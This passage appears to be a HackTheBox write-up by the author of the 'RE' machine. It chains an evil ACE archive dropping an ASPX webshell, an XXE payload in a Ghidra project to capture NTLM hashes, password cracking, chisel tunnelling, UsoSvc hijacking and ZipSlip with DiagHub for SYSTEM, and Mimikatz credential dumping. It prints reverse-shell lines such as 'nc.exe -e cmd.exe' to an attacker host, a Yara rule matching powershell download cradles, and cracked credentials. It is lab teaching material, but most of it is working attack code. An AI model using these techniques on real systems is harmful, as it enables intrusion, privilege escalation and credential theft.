I’ll use [this tool](https://github.com/manulqwerty/Evil-WinRAR-Gen). I’ll also use a [simple aspx webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) since the headers from the site indicate it’s running ASP.NET:

```

X-Powered-By: ASP.NET

```

I’ll run the tool like this:

```

root@kali# python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -o webshell.ace -e shell.aspx -g test.txt -p 'c:\inetpub\wwwroot\re\'

```

and it creates webshell.ace.

### Upload and Drop

Now I just need to get it to target. I’ll start a Python webserver and upload it with powershell:

```

PS C:\users\luke\documents\ods> wget 10.10.14.11/webshell.ace -outfile a.rar
PS C:\users\luke\documents\ods> dir

    Directory: C:\users\luke\documents\ods

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/24/2020   5:30 PM           1667 a.rar 

PS C:\users\luke\documents\ods> dir
PS C:\users\luke\documents\ods> 

```

The first time I run `dir` I see it, but the next it’s gone. Once it’s gone, I’ll try the webshell, and I have RCE as iis apppool\re:

![1553715660330](https://0xdfimages.gitlab.io/img/1553715660330.png)

I’ll use powershell to get another Nishang shell:

![image-20200124203309334](https://0xdfimages.gitlab.io/img/image-20200124203309334.png)

When I hit “Run”, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.1.1.183.
Ncat: Connection from 10.1.1.183:49855.
Windows PowerShell running as user RE$ on RE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\re

```

## Shell as coby (administrator)

### Enumeration

I’ll return to the `c:\proj_drop` dir and find that now I can both write to it and enter it:

```

PS C:\> icacls proj_drop
proj_drop CREATOR OWNER:(OI)(CI)(IO)(F)
          NT AUTHORITY\SYSTEM:(OI)(CI)(F)
          RE\coby:(OI)(CI)(M)
          BUILTIN\Administrators:(OI)(CI)(F)
          IIS APPPOOL\re:(OI)(CI)(M)

```

I’ll also find that if I write something there, it disappears almost instantly:

```

PS C:\proj_drop> echo test > test
PS C:\proj_drop> ls

    Directory: C:\proj_drop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/27/2019  12:48 PM             14 test

PS C:\proj_drop> ls
PS C:\proj_drop> 

```

### Exploit

The coming soon website was talking about creating a way to upload Ghidra project files. There’s an [XXE vulnerability these files](https://github.com/NationalSecurityAgency/ghidra/issues/71).

I’ll create a file structure to look like the project. I’ll just use Ghidra, create an empty project, and then edit the project.prp file to include the XXE attack:

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "//10.10.14.11/xxe" >
  %xxe;
]>
<FILE_INFO>
    <BASIC_INFO>
        <STATE NAME="OWNER" TYPE="string" VALUE="coby" />
    </BASIC_INFO>
</FILE_INFO>

```

I’ve added lines 2-5, which will request a file from my host, which should be enough to get NetNTLMv2 hashes in responder.

I’ll zip up the project:

```

root@kali# zip -r ../test.zip *
  adding: test.gpr (stored 0%)
  adding: test.rep/ (stored 0%)
  adding: test.rep/user/ (stored 0%)
  adding: test.rep/user/~index.dat (stored 0%)
  adding: test.rep/project.prp (deflated 25%)
  adding: test.rep/versioned/ (stored 0%)
  adding: test.rep/versioned/~index.dat (stored 0%)
  adding: test.rep/versioned/~index.bak (stored 0%)
  adding: test.rep/idata/ (stored 0%)
  adding: test.rep/idata/~index.dat (stored 0%)
  adding: test.rep/idata/~index.bak (stored 0%)
  adding: test.rep/projectState (deflated 48%)

```

It is important that the structure of the zip matches what was described in the HTML source earilier.

I’ll fire up responder and then upload my zip into the dir:

```

PS C:\proj_drop> iwr -uri 10.10.14.11/test.zip -outfile a.zip

```

Almost immediately, the file is gone. Within a minute, I get a connection on Responder:

```

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.144
[SMB] NTLMv2-SSP Username : RE\coby
[SMB] NTLMv2-SSP Hash     : coby::RE:3d5eb235a70d68be:5F2F28984D876C241346020330D6BB80:0101000000000000C0653150DE09D201F552845CF094DC84000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000004DD2371894F9D11AAC79CAB3C14640F00769695A9AE251FBB41859B4134C9C960A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
...[snip]...

```

I can crack the password instantly with rockyou:

```

david@meeks:~/Dropbox/CTFs/hackthebox/re$ hashcat -m 5600 coby.ntlm  --show
coby::RE:3d5eb235a70d68be:5F2F28984D876C241346020330D6BB80:0101000000000000C0653150DE09D201F552845CF094DC84000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000004DD2371894F9D11AAC79CAB3C14640F00769695A9AE251FBB41859B4134C9C960A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000:championship2005

```

### WinRM

I can see from either of my shells that coby is in both the “Administrators” and “Remote Management Users” group:

```

PS C:\users\luke\documents\ods> net user coby
User name                    coby
Full Name                    coby
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/27/2019 7:23:42 AM
Password expires             Never
Password changeable          3/27/2019 7:23:42 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/25/2020 4:02:22 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.

```

I can also see in the local `netstat` that RE is listening on 5985:

```

PS C:\users\luke\documents\ods> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       820
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       448
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       972
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1696
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       588
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       604
  TCP    10.10.10.144:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       820
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       448
  TCP    [::]:49665             [::]:0                 LISTENING       972
  TCP    [::]:49666             [::]:0                 LISTENING       952
  TCP    [::]:49667             [::]:0                 LISTENING       1696
  TCP    [::]:49668             [::]:0                 LISTENING       588
  TCP    [::]:49669             [::]:0                 LISTENING       604

```

Since I didn’t see it in the original `nmap`, it must have been firewalled off.

The “Remote Management Users” group plus 5985 means that I can use these creds to get a shell with WinRM. I could just run commands as Coby to dump the flag, but I want a shell. I’ll need to tunnel, so I’ll upload chisel:

```

PS C:\programdata> iwr -uri 10.10.14.11/chisel_windows_amd64.exe -outfile c.exe

```

Now I’ll run the server locally:

```

root@kali# /opt/chisel/chisel server -p 8000 --reverse
2020/01/24 20:50:49 server: Reverse tunnelling enabled
2020/01/24 20:50:49 server: Fingerprint b7:4c:26:51:c5:55:3f:4b:37:cd:77:f7:08:b4:78:32
2020/01/24 20:50:49 server: Listening on 0.0.0.0:8000...

```

And connect back to it creating the tunnel to WinRM:

```

PS C:\programdata> .\c.exe client 10.10.14.11:8000 R:5985:localhost:5985

```

It’s received by the server:

```

2020/01/24 20:51:16 server: session#1: Client version (1.3.1) differs from server version (0.0.0-src)
2020/01/24 20:51:16 server: proxy#1:R:0.0.0.0:5985=>localhost:5985: Listening

```

Now I can connect with [EvilWinRM](https://github.com/Hackplayers/evil-winrm) to get a shell (for some reason `localhost` works but `127.0.0.1` doesn’t):

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i localhost -u coby -p championship2005

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\coby\Documents>

```

Since coby is in the Administrators group, I can go get `root.txt`:

```

PS re\coby@RE desktop> type root.txt
1B4FB905************************

```

## Unintended Paths via SYSTEM

There are two paths to get a shell as SYSTEM that were both unintended, due to my not applying the correct Windows Updates.

### Path 1: Abuse UsoSvc

#### Enumeration

It turns out that the [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) tools are present on RE:

```

PS C:\Program Files> dir Sys*

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/14/2019   6:35 AM                Sysinternals   

```

This makes sense since it is a reverse engineer’s box. There are a lot of ways to identify vulnerable services, including Window privesc scripts like [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) or [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). But a basic technique I learned in OSCP is using `accesschk` from Sysinternals to look for services I can write to.

From luke, I don’t get any:

```

PS C:\Program Files\Sysinternals> whoami
re\luke

PS C:\Program Files\Sysinternals> .\accesschk -accepteula -uvwc *

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

Error opening Service Control Manager:
Access is denied.

No matching objects found.

```

But as IIS, I get a ton. If I search for `NT AUTHORITY\SERVICE`, there’s only one match:

```

PS C:\Program Files\Sysinternals> whoami
iis apppool\re

PS C:\Program Files\Sysinternals> .\accesschk -accepteula -uvwc *

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com
...[snip]...
UsoSvc                      
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM   
        SERVICE_ALL_ACCESS                      
  RW NT AUTHORITY\SERVICE                       
        SERVICE_ALL_ACCESS
...[snip]...

```

And IIS is in that group:

```

PS C:\Program Files\Sysinternals> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group

```

#### Modify Service

I’ll upload `nc.exe` to RE:

```

PS C:\programdata> wget -o nc.exe 10.10.14.11/nc64.exe

```

Now I can check the default `ImagePath`:

```

PS C:\> reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\usosvc
    ImagePath    REG_EXPAND_SZ    %systemroot%\system32\svchost.exe -k netsvcs -p

```

I’ll change it to `nc`:

```

PS C:\> sc.exe config usosvc binPath= "C:\programdata\nc.exe -e cmd.exe 10.10.14.11 443"
[SC] ChangeServiceConfig SUCCESS

PS C:\> reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\usosvc
    ImagePath    REG_EXPAND_SZ    C:\programdata\nc.exe -e cmd.exe 10.10.14.11 443

```

Now Ill just restart the service:

```

PS C:\> sc.exe stop usosvc

SERVICE_NAME: usosvc 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530
PS C:\> sc.exe start usosvc

```

I get a shell as SYSTEM on a new listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443                             
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:49719.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami                                                                                   
whoami                                        
nt authority\system

```

The problem here is that after 30 seconds, the service fails to start (because `nc.exe` isn’t a service binary):

```

PS C:\> sc.exe start usosvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

The shell dies too. I could create a service binary, but the cheap workaround when using `nc.exe` is to just create a new connection out that’s not running as a service.

Start `nc` listeners on both 443 and 445. Then start the service. Once it connects to 443, run `nc.exe` again:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:49726.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>\programdata\nc.exe 10.10.14.11 445 -e cmd.exe

```

The new connection will live even after the first one dies:

```

root@kali# rlwrap nc -lnvp 445              
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:49727.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system  

```

### Path 2: ZipSlip

#### POC

Given the lack of patches on RE, there’s a ZipSlip vuln in Windows itself as well. I’ll use [evilarc](https://github.com/ptoomey3/evilarc) to create a zip.

```

root@kali# echo '0xdf was here' > card.txt
root@kali# /opt/evilarc/evilarc.py -f sys32.zip -o win -p '\windows\system32' card.txt 
Creating sys32.zip containing ..\..\..\..\..\..\..\..\\windows\system32\card.txt

```

Now I’ll upload that zip into `\proj_drop` on RE:

```

PS C:\proj_drop> wget 10.10.14.11/sys32.zip -out 1.zip
PS C:\proj_drop> ls
PS C:\proj_drop> type \windows\system32\card.txt
0xdf was here

```

It was gone before I could see it with `ls`, but my text file was written to `\system32`, which only administrator / SYSTEM should be able to write to.

#### Diaghub

The DiagHub technique is a method for going from arbitrary write to a SYSTEM shell. I first learned this in [Hackback](/2019/07/06/htb-hackback.html#arbitrary-write--diaghub--system). Since then, decoder has published a [simpler codebase for this](https://github.com/decoder-it/diaghub_exploit), so I’ll use that. I’ll download the zip from GitHub to my Commando Windows VM, unzip it, and open the project in Visual Studio.

There’s no documentation, so I’ll have to figure this code out. There’s two parts - an exe that runs the exploit, and a dll that is an example payload.

I’ll start with the dll, and check out `FakeDll.cpp`. I see this section:

```

	PROCESS_INFORMATION proc_info = {};
	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	WCHAR cmdline[] = L"C:\\temp\\r.bat";
	// could also call CreateProcess() ....
	if (!CreateProcessAsUser(duptoken, nullptr, cmdline, nullptr,
		nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		//WCHAR buf[256];
		//StringCchPrintf(buf, 256, L"Couldn't create process %d\n", GetLastError());
		//OutputDebugString(buf);
		return E_FAIL;
	}

	return S_OK;

```

I’ll check, and I can’t write to `C:\temp` with my current shell, so I’ll change that path to `C:\\programdata\r.bat`. Otherwise, I’ll leave the dll code alone.

In `diaghub_exploit.cpp`, I’ll scan the code as well. I can see the instructions for calling it in `wmain`:

```

printf("specify fakedll name (without path)\n");

```

At the top of the `LoadDll` function, it defines `valid_dir`. I remember from Hackback having to play with that. I’ll change `temp` to `programdata` again here too.

Now I’ll build for x64 Release, and copy both the output dll and exe back to my Linux workstation. I’ll name the dll `df.dll`, and put it into a zip to get into `system32`:

```

root@kali# /opt/evilarc/evilarc.py -f sys32.zip -o win -p '\windows\system32' df.dll
Creating sys32.zip containing ..\..\..\..\..\..\..\..\\windows\system32\df.dll

```

I’ll upload that to `proj_drop`, and verify the dll made it to `system32`:

```

PS C:\programdata> wget 10.10.14.11/sys32.zip -o \proj_drop\a.zip
PS C:\programdata> dir \windows\system32\df.dll

    Directory: C:\windows\system32

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/25/2020   3:32 PM          90112 df.dll 

```

I’ll also create an `r.bat` on my Linux machine, and then upload it with `wget` to `programdata`:

```

PS C:\programdata> wget http://10.10.14.11/r.bat -o r.bat
PS C:\programdata> type r.bat
C:\programdata\nc.exe -e cmd 10.10.14.11 443 

```

I’ll test it by just running it, and verifying I get a callback on a `nc` listener:

```

PS C:\programdata> .\r.bat
C:\programdata>C:\programdata\nc.exe -e cmd 10.10.14.11 443  

```

It works.

Now I just need the exploit exe. I’ll upload it, and give it a run:

```

PS C:\programdata> wget 10.10.14.11/diaghub_exploit.exe -o dh.exe
PS C:\programdata> .\dh.exe df.dll
[+] Created dir:C:\programdata\etw
[+] CoCreateInstance
[+] CoQueryProxyBlanket
[+] CoSetProxyBlanket
[+] service->CreateSession
[+] service->AddAgent
[+] DLL should have been loaded

```

In my `nc` listener, I get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:49714.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

### Read root.txt as SYSTEM

#### EFS

Even as SYSTEM, I can’t read `root.txt:`

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

```

That’s because it’s encrypted with EFS:

```

C:\Users\Administrator\Desktop>cipher /c root.txt
cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    RE\Administrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D 

    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.

```

Only coby and administrator can read it.

#### Get Coby Password

I’ll upload [Mimikatz](https://github.com/gentilkiwi/mimikatz) to RE (I had some of the same version issues I had in Helpline, and the [same solution](/2019/08/17/htb-helpline-kali.html#fix-issue-with-version) fixed it):

```

PS C:\ProgramData> wget -o m.exe 10.10.14.11/mimikatz.exe

```

Now I’ll run it and dump creds:

```

PS C:\ProgramData> .\m.exe
  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
  
mimikatz # privilege::debug
Privilege '20' OK                                          
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 109186 (00000000:0001aa82)         
Session           : Batch from 0                           
User Name         : luke                                   
Domain            : RE                                     
Logon Server      : RE                                     
Logon Time        : 1/25/2020 8:07:41 AM                   
SID               : S-1-5-21-311800348-2366743891-1978325779-1001
        msv :                                              
         [00000003] Primary                                
         * Username : luke                                 
         * Domain   : RE                                   
         * NTLM     : 3670611a3c1a68757854520547ab5f24
         * SHA1     : cfb0c5babedce9b6d72f13f2ce205e1eb4eebd21
        tspkg :                                            
        wdigest :                                          
         * Username : luke                                 
         * Domain   : RE                                   
         * Password : (null)                               
        kerberos :                                         
         * Username : luke                                 
         * Domain   : RE                                   
         * Password : (null)                               
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 108805 (00000000:0001a905)         
Session           : Batch from 0                           
User Name         : coby                                   
Domain            : RE                                     
Logon Server      : RE                                     
Logon Time        : 1/25/2020 8:07:41 AM                   
SID               : S-1-5-21-311800348-2366743891-1978325779-1000
        msv :                                              
         [00000003] Primary                                
         * Username : coby                                 
         * Domain   : RE                                   
         * NTLM     : fa88e03e41fdf7b707979c50d57c06cf
         * SHA1     : 7e7e2d4da4a1d6947ab286492fc3211fb70ba4c4
        tspkg :                                            
        wdigest :                                          
         * Username : coby                                 
         * Domain   : RE                                   
         * Password : (null)                               
        kerberos :                                         
         * Username : coby                                 
         * Domain   : RE                                   
         * Password : (null)                               
        ssp :                                              
        credman : 
...[snip]...

```

Having the hashes for coby is enough to [decrypt the file](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files), just like I [did in Helpline](/2019/08/17/htb-helpline-kali.html#read-roottxt). But I can take a shorter route here. That NTLM is crackable. I could break it in `hashcat` with `rockyou`, but in this case I toss it into hashes.org (now gone):

![image-20200125112620176](https://0xdfimages.gitlab.io/img/image-20200125112620176.png)

#### Read File

Because coby is in Remote Management Users (or Administrators), I can run commands over WinRM as that user.

```

PS C:\> $pass = "championship2005"
PS C:\> $sec_pass = ConvertTo-SecureString -String $pass -AsPlainText -Force
PS C:\> $coby_cred = New-Object System.Management.Automation.PSCredential('RE\coby', $sec_pass)
PS C:\> Invoke-Command -ScriptBlock { type \users\administrator\desktop\root.txt } -Credential $coby_cred -Computer localhost
1B4FB905************************

```

Obviously I could do more https://www.youtube.com/watch?v=YXAakamjO\_Ithan just get the flag. I could also get a shell with `nc.exe`, etc.

## Beyond Root

### Document Filtering

While uploading the initial `.ods` file get execution, the post warns that it’s only interested in files that don’t come from Metasploit. I wanted to push you to have to make one on your own.

The uploaded files are run against this Yara rule file. If any of the three rules hits, the file isn’t opens:

```

rule metasploit 
{
        strings:
	        $getos = "select case getGUIType" nocase wide ascii
			$getext = "select case GetOS" nocase wide ascii
			$func1 = "Sub OnLoad" nocase wide ascii
			$func2 = "Sub Exploit" nocase wide ascii
			$func3 = "Function GetOS() as string" nocase wide ascii
			$func4 = "Function GetExtName() as string" nocase wide ascii
			
		condition:
		    (all of ($get*) or 2 of ($func*))
			
}

rule powershell
{
        strings:
			$psh1 = "powershell" nocase wide ascii
			$psh2 = "new-object" nocase wide ascii
			$psh3 = "net.webclient" nocase wide ascii
			$psh4 = "downloadstring" nocase wide ascii
			$psh5 = "iex" nocase wide ascii
			$psh6 = "-e" nocase wide ascii
			
		condition:
		    2 of ($psh*)
			
}

rule cmd
{
        strings:
		    $cmd = "cmd /c" nocase wide ascii
		condition:
            $cmd
}

```

If any hit, then the macro is not run. The attacker should take hints from the blog to get properly obfuscated code that will get by the filter.

### Automating Ghidra

Automating the opening of Ghidra project files was a bit tricky. I played around with the software long enough to see where the previous project name was stored, in `C:\Users\coby\.ghidra\.ghidra-9.0\preferences`. So I moved the project file into place and unzipped it, then edited that file to point to the uploaded project.

Then I started Ghidra running. It them slept for some period of time, and then killed Ghidra. It removed that archive, and looped to looking for the next.

When I was testing on my local machine, it took about 5-6 seconds for Ghidra to open and for the XXE to fire, with hashes showing up at Responder. So I set the sleep for 12 seconds. Obviously this is a balance. Longer sleep means other players are waiting longer. Shorter sleep risks killing Ghidra before it has a chance to run.

This was the script that was constantly running as coby when I submitted:

```

$dropbox = "C:\proj_drop"
$proj_dir = "C:\users\coby\ghidra_projects\import"
$ghidra_bat = "C:\users\coby\ghidra_9.0\ghidraRun.bat"
$ghidra_config = "C:\Users\coby\.ghidra\.ghidra-9.0\preferences"

while ($true) {
        Get-ChildItem $dropbox | ForEach-Object {

                if ($_.Extension -eq ".zip") {

            Remove-Item $proj_dir\* -Recurse -Force

            Expand-Archive -LiteralPath $_.fullname -DestinationPath $proj_dir

                    # get project name
                    Get-ChildItem -Path $proj_dir -filter *.rep | ForEach-Object {
                                $proj_name = $_.name -replace ".rep",""
                                $last_open = "LastOpenedProject=$proj_dir\$proj_name"
                $proj_prp = '{0}\{1}.rep\project.prp' -f $proj_dir, $proj_name
                if([System.IO.File]::Exists($proj_prp)) {

                            #replace name in $ghidra config
                            Get-Content $ghidra_config | findstr /v LastOpenedProject | Set-Content $ghidra_config
                            (echo $last_open) -replace "\\","\\" | Out-File -encoding ASCII -append $ghidra_config

                                        # run project
                            $ghidra = Start-Process -passthru $ghidra_bat
                            Start-Sleep 12
                            stop-process -force -name javaw
                }
            }
                }

                Remove-Item -Path $_.fullname

        }

        Start-Sleep 2
}

```

It worked fine in testing as a local VM for the HTB team. But when it deployed, it didn’t work. No one was able to get XXE to respond.

Big props to [jkr](https://twitter.com/ATeamJKR) for troubleshooting this one (I was on vacation the week the box was released, driving through Germany without much in the way of internet access). He removed the sleep, and figured out that for whatever reason, on the HTB lab hardware, it was taking ~30 seconds to open Ghidra and for the XXE to fire. The HTB admins patched the script to sleep for 50 seconds after running Ghidra. And it works today.